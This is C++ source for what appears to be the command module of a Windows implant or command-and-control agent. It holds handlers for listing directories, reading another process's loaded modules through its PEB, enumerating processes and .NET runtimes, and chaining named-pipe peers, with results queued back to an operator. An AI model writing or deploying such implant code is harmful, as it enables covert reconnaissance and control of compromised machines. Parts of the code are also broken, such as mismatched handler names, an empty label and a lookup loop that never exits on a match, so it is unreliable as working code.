#include <core/include/commands.hpp>
using namespace Peers;
using namespace Parser;
using namespace Stream;
using namespace Dispatcher;

namespace Commands {

    RDATA HASH_MAP cmd_map[] = {
        { .name = DIRECTORYLIST, 	.address = DirectoryList  },
        { .name = PROCESSMODULES,	.address = ProcessModules },
        { .name = PROCESSLIST,		.address = ProcessList    },
        { .name = ADDPEER,			.address = AddPeer        },
        { .name = REMOVEPEER,		.address = RemovePeer     },
        { .name = SHUTDOWN,			.address = Shutdown       },
        { .name = 0,				.address = nullptr					}
    };

    VOID DirectoryList (_parser *const parser) {

        _stream *out = CreateTaskResponse(DIRECTORYLIST);

        ULONG length    = 0;
        LPSTR query     = nullptr;
        LPSTR path      = nullptr;
        HANDLE handle   = nullptr;

        WIN32_FIND_DATAA head       = { };
        ULARGE_INTEGER handle_size  = { };
        SYSTEMTIME access_time      = { };
        SYSTEMTIME sys_time         = { };

        query   = UnpackString(parser, nullptr);
        path    = (char*) Malloc(MAX_PATH);

        if (query[0] == PERIOD) {
            x_assert(length = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, path));

            if (path[length - 1] != BSLASH) {
                path[length++] = BSLASH;
            }

            path[length++]  = ASTER;
            path[length]    = NULTERM;
        }
        else {
            MemCopy(path, query, MAX_PATH);
        }

        if ((handle = Ctx->win32.FindFirstFileA(path, &head))) {
            do {
                x_assert(Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time));
                x_assert(Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time));

                if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    PackUint32(out, TRUE);
                }
                else {
                    handle_size.HighPart   = head.nFileSizeHigh;
                    handle_size.LowPart    = head.nFileSizeLow;

                    PackUint32(out, FALSE);
                    PackUint64(out, handle_size.QuadPart);
                }

                PackUint32(out, access_time.wMonth);
                PackUint32(out, access_time.wDay);
                PackUint32(out, access_time.wYear);
                PackUint32(out, sys_time.wHour);
                PackUint32(out, sys_time.wMinute);
                PackUint32(out, sys_time.wSecond);
                PackString(out, head.cFileName);
            }
            while (Ctx->win32.FindNextFileA(handle, &head) != 0);
        }
        else {
            goto defer;
        }

        MessageQueue(out);

        defer:
        if (handle) {
            Ctx->win32.FindClose(handle);
        }
        if (path) {
            Free(path);
        }
    }

    VOID ProcessModules (_parser *const parser) {

        _stream *out = CreateTaskResponse(PROCESSMODULES);

        LDR_DATA_TABLE_ENTRY module     = { };
        PROCESS_BASIC_INFORMATION pbi   = { };

        PPEB_LDR_DATA loads         = nullptr;
        PLIST_ENTRY head 	        = nullptr;
        PLIST_ENTRY entry           = nullptr;
        HANDLE process              = nullptr;

        char modname_a[MAX_PATH]    = { };
        wchar_t modname_w[MAX_PATH] = { };

        uint32_t pid    = 0;
        uint32_t count  = 0;
        size_t size     = 0;

        x_assert(pid = Process::GetProcessIdByName(UnpackString(parser, nullptr)));
        x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));

        x_ntassert(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(LDR_DATA_TABLE_ENTRY*), &size));
        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));

        for (head = &loads->InMemoryOrderModuleList; entry != head; entry = module.InMemoryOrderLinks.Flink) {
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));

            x_assert(size == module.FullDllName.Length);

            if (module.FullDllName.Length > 0) {
                size = WcsToMbs(modname_a, modname_w, module.FullDllName.Length);

                PackString(out, modname_a);
                PackPointer(out, module.DllBase);
                count++;
            }

            MemSet(modname_w, 0, MAX_PATH);
            MemSet(modname_a, 0, MAX_PATH);
        }

        MessageQueue(out);
        defer:
    }

    VOID ProcessList(_parser *const parser) {

        _stream *out = CreateTaskResponse(PROCESSLIST);

        PROCESSENTRY32 entries      = { };
        HANDLE snapshot             = { };
        HANDLE process              = { };

        IEnumUnknown *enums         = { };
        ICLRMetaHost *meta          = { };
        ICLRRuntimeInfo *runtime    = { };

        WCHAR buffer[1024];
        DWORD size = 0;

        size            = ARRAY_LEN(buffer);
        entries.dwSize  = sizeof(PROCESSENTRY32);

        x_assert(snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
        x_assert(Ctx->win32.Process32First(snapshot, &entries));

        do {
            CLIENT_ID cid = { };
            OBJECT_ATTRIBUTES attr = { };

            cid.UniqueThread    = nullptr;
            cid.UniqueProcess   = (void*) entries.th32ProcessID;

            BOOL is_managed  = false;
            BOOL is_loaded   = false;

            InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);

            x_ntassert(Ctx->nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid));
            x_ntassert(Ctx->nt.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta));
            x_ntassert(meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums));

            while (S_OK == enums->Next(0x1, (IUnknown**) &runtime, nullptr)) {
                if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {

                    is_managed = true;
                    if (SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &size))) {
                        PackUint32(out, entries.th32ProcessID);
                        PackString(out, entries.szExeFile);
                        PackWString(out, buffer);
                    }
                }
                runtime->lpVtbl->Release(runtime);
            }

            if (!is_managed) {
                PackUint32(out, entries.th32ProcessID);
                PackString(out, entries.szExeFile);
                PackWString(out, 0);
            }

            if (process) {
                Ctx->nt.NtClose(process);
            }
            if (meta) {
                meta->lpVtbl->Release(meta);
            }
            if (runtime) {
                runtime->lpVtbl->Release(runtime);
            }
            if (enums) {
                enums->Release();
            }
        }
        while (Ctx->win32.Process32Next(snapshot, &entries));

        MessageQueue(out);

        defer:
        if (snapshot) {
            Ctx->nt.NtClose(snapshot);
        }
    }

    VOID CommandAddPeer(_parser *parser) {

        auto pipe_name  = UnpackWString(parser, nullptr);
        auto peer_id    = UnpackUint32(parser);

        AddPeer(pipe_name, peer_id);
    }

    VOID CommandRemovePeer(_parser *parser) {

        auto peer_id = UnpackUint32(parser);
        RemovePeer(peer_id);
    }

    VOID Shutdown (_parser *parser) {

        // Send final message
        // Zero/Free all memory
        // Exit
        ntstatus = ERROR_EXIT;
    }


    UINT_PTR GetCommandAddress(const uint32_t name) {

        uintptr_t address = { };

        for (uint32_t i = 0 ;; i++) {
            if (!cmd_map[i].name) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (cmd_map[i].name == name) {
                address = U_PTR(cmd_map[i].address);
            }
        }

        defer:
        return address;
    }
}
